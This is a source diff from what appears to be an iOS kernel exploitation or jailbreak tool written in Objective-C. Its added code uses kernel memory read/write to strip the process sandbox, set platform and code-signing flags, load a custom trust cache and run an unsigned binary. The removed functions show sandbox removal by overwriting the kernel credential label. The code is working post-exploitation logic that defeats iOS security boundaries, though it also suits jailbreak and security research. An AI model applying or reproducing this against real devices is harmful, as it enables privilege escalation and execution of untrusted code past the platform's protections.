@@ -12,6 +12,8 @@
 #import "krw.h"
 #import "offsets.h"
 #import "amfi.h"
+#import "sandbox.h"
+#import "trustcache.h"
 
 
 void HexDump(uint64_t addr, size_t size) {
@@ -94,31 +96,7 @@ pid_t pid_by_name(char* nm) {
     return kread32(proc + off_p_pid);
 }
 
-uint64_t unsandbox(pid_t pid) {
-    printf("[*] Unsandboxing pid %d\n", pid);
-    
-    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
-    uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
-    uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
-    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
-    
-    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
-    
-    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
-}
 
-BOOL sandbox(pid_t pid, uint64_t sb) {
-    if (!pid) return NO;
-    
-    printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
-    
-    uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
-    uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
-    uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
-    kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
-    
-    return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
-}
 
 BOOL rootify(pid_t pid) {
     if (!pid) return NO;
@@ -418,7 +396,7 @@ int save_for_kcall(uint64_t fake_vtable, uint64_t fake_client) {
         @"kcall_fake_client": @(fake_client)
     };
     
-    BOOL success = [dictionary writeToFile:@"tmp/kfd-arm64.plist" atomically:YES];
+    BOOL success = [dictionary writeToFile:@"/tmp/kfd-arm64.plist" atomically:YES];
     if (!success) {
         printf("[-] Failed createPlistAtPath.\n");
         return -1;
@@ -441,38 +419,43 @@ int do_fun(void) {
     
     printf("[i] rootify ret: %d\n", rootify(getpid()));
     printf("[i] uid: %d, gid: %d\n", getuid(), getgid());
+
+    prepare_kcall();
     
-//    uint64_t sb = unsandbox(getpid());
-//    printf("[i] our_sandbox: 0x%llx\n", sb);
-    
-    uint64_t fake_vtable, fake_client = 0;
-    if(access("/tmp/kfd-arm64.plist", F_OK) == 0) {
-        uint64_t sb = unsandbox(getpid());
-        NSDictionary *kcalltest14_dict = [NSDictionary dictionaryWithContentsOfFile:@"/tmp/kfd-arm64.plist"];
-        fake_vtable = [kcalltest14_dict[@"kcall_fake_vtable"] unsignedLongLongValue];
-        fake_client = [kcalltest14_dict[@"kcall_fake_client"] unsignedLongLongValue];
-        sandbox(getpid(), sb);
-    } else {
-        kalloc_using_empty_kdata_page(&fake_vtable, &fake_client);
-        //Once if you successfully get kalloc to use fake_vtable and fake_client,
-        //DO NOT use dirty_kalloc again since unstable method.
-        uint64_t sb = unsandbox(getpid());
-        save_for_kcall(fake_vtable, fake_client);
-        sandbox(getpid(), sb);
-        printf("Saved fake_vtable, fake_client for kcall.\n");
-        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
-    }
-    
-    mach_port_t user_client = 0;
-    init_kcall_allocated(fake_vtable, fake_client, &user_client);
     
     size_t allocated_size = 0x1000;
-    uint64_t allocated_kmem = kalloc(user_client, fake_client, allocated_size);
+    uint64_t allocated_kmem = kalloc(allocated_size);
     kwrite64(allocated_kmem, 0x4142434445464748);
     printf("allocated_kmem: 0x%llx\n", allocated_kmem);
     HexDump(allocated_kmem, allocated_size);
     
-    kfree(user_client, fake_client, allocated_kmem, allocated_size);
+    kfree(allocated_kmem, allocated_size);
+    
+//    char* _token = token_by_sandbox_extension_issue_file("com.apple.app-sandbox.read-write", "/", 0);
+//    printf("consume ret: %lld\n", sandbox_extension_consume(_token));
+//    char* _token2 = token_by_sandbox_extension_issue_file("com.apple.sandbox.executable", "/", 0);
+//    printf("token2: %s\n", _token2);
+//    printf("consume ret: %lld\n", sandbox_extension_consume(_token2));
+
+    NSArray *fileList = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile/Library" error:nil];
+    NSLog(@"fileList: %@", fileList);
+    
+    uint64_t sb = unsandbox(getpid());
+    set_task_platform(getpid(), true);
+    set_proc_csflags(getpid());
+    set_csb_platform_binary(getpid());
+    
+    util_runCommand("/bin/ps", "-A", NULL);
+    
+    NSString* tcpath = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries.tc"];
+    staticTrustCacheUploadFileAtPath(tcpath, NULL);
+    
+    const char* path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/unsignedhelloworld"].UTF8String;
+    chmod(path, 0755);
+    printf("unsigned binaries path: %s\n", path);
+    util_runCommand(path, NULL, NULL);
+    
+    sandbox(getpid(), sb);
     
     return 0;
 }
